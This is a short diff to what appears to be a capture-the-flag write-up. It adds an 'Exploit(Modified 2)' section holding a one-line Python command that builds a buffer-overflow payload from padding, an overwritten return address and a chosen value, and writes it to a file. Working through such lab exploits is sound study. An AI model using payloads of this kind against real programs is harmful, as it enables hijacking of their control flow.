@@ -81,3 +81,10 @@ The answer is even!
 You are wrong, too bad
 Well done, you have the flag!
 ```
+
+
+## Exploit(Modified 2)
+
+```bash
+ (python3 -c 'print( "A" * 24 + "\x69\x52\x55\x55\x55\x55\x00\x00" + "A" * 8 +  "\x09\x03\x00\x00\x00\x00\x00\x00")') > payload
+```
